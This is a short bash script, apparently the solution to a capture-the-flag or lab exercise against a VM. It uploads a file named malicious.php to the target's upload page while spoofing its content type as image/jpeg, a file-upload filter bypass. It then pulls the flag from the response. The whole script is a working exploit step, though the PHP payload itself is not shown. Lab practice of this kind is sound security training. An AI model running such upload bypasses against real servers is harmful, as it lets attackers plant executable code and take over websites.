#!/bin/bash

echo "input the VM ip address :"
read ip

url="http://${ip}/"
dir="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"

response=$(curl -s -X POST -F "uploaded=@${dir}/malicious.php;type=image/jpeg" -F "Upload=Upload" "${url}?page=upload" | grep "flag")
response=$(cut -f3 -d ":" <<< $response | cut -c -65)
echo "FLAG:${response}"
